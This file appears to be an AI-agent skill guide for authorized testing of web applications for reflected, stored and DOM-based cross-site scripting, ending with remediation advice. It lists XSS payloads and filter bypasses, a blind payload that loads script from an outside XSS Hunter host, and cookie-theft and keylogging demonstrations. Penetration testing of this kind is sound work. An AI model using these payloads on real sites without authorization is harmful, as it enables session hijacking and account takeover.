---
name: testing-for-xss-vulnerabilities
description: >-
  Tests web applications for reflected, stored, and DOM-based Cross-Site
  Scripting by injecting JavaScript payloads and browser tools, then
  bypassing sanitization and CSP to demonstrate session hijacking and user
  impersonation. Use for OWASP WSTG client-side injection testing or when
  evaluating input sanitization and output encoding coverage.
domain: cybersecurity
subdomain: penetration-testing
tags: [XSS, cross-site-scripting, client-side-security, OWASP-A03, JavaScript-injection]
version: 1.0.0
author: mahipal
license: Apache-2.0
source: https://github.com/mukul975/Anthropic-Cybersecurity-Skills
nist_csf: [ID.RA-01, ID.RA-06, GV.OV-02, DE.AE-07]
mitre_attack: [T1595, T1190, T1059, T1078, T1055]
---

# Testing for XSS Vulnerabilities

> **Legal Notice:** Authorized security testing only. Do not deploy persistent payloads that affect real users or exfiltrate real session tokens in production.

## When to Use

- Testing web applications for client-side injection as part of OWASP WSTG testing
- Evaluating input sanitization and output encoding across all application features
- Assessing Content Security Policy (CSP) effectiveness against XSS
- Testing SPAs (React, Angular, Vue) for DOM-based XSS in client-side routing/rendering

## Prerequisites

- Authorized scope defining target and acceptable activities
- Burp Suite Professional (XSS Validator, Reflector, Active Scan++)
- Browser dev tools + XSS testing extensions (HackBar, XSS Hunter)
- XSS Hunter / Burp Collaborator for out-of-band blind XSS confirmation
- SecLists XSS payload lists

## Workflow

### Step 1: Input and Output Mapping

- **Reflected inputs**: every URL parameter, search field, error message, header value reflected in the response
- **Stored inputs**: profiles, comments, forum posts, filenames, tickets, chat messages
- **DOM inputs**: JS reading `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage` and writing to the DOM
- **Output context**: HTML body, HTML attribute, JS string, URL/href, CSS — payload choice depends on context

### Step 2: Reflected XSS Testing

- HTML body: `<script>alert(document.domain)</script>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`
- HTML attribute: `" onfocus=alert(1) autofocus="`, `"><script>alert(1)</script>`
- JS string: `';alert(1)//`, `</script><script>alert(1)</script>`
- URL/href: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`
- Filter bypass: case variation `<ScRiPt>`, event handlers `<details open ontoggle=alert(1)>`, HTML entity encoding

### Step 3: Stored XSS Testing

- Submit unique-tagged payloads to every stored field: `<script>alert('XSS-PROFILE-001')</script>`
- Check every page where the stored value is rendered (may be admin-only views)
- Test file upload (HTML/SVG with embedded scripts, malicious filenames)
- Blind stored XSS: `"><script src=https://yourxsshunter.xss.ht></script>` for admin panels you can't directly access

### Step 4: DOM-Based XSS Testing

- **Sources**: `document.location`, `document.URL`, `document.referrer`, `location.hash`, `window.name`, `postMessage` data
- **Sinks**: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `jQuery.html()`, `v-html` (Vue), `dangerouslySetInnerHTML` (React)
- Trace data flow from source to sink; unsanitized flow = DOM XSS

### Step 5: CSP Bypass and Impact

- Weak CSP indicators: `unsafe-inline`, `unsafe-eval`, wildcard domains, missing `base-uri`
- JSONP bypass if an allowed domain hosts a JSONP endpoint
- Impact demo: session hijacking via cookie exfiltration, phishing overlay, keylogging, forced password reset

## Key Concepts

| Term | Definition |
|------|------------|
| Reflected XSS | Payload included in the response to the same request (needs victim to click a crafted URL) |
| Stored XSS | Payload persisted server-side and served to other users |
| DOM-Based XSS | Occurs entirely client-side via unsafe JS source→sink flow |
| CSP | Header restricting allowed script/style/resource sources |
| Output Encoding | Converting special chars to entities to prevent code interpretation |

## Remediation (defensive takeaway)

1. Context-aware output encoding (HTML entity encode for HTML body, JS-escape for JS strings, URL-encode for URLs)
2. Deploy CSP: `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'`
3. Set `HttpOnly` and `Secure` on session cookies
4. Server-side HTML sanitization with an allowlist of safe tags (never trust client-side sanitization alone)
5. Avoid dangerous sinks (`innerHTML`, `v-html`, `dangerouslySetInnerHTML`) with unsanitized input
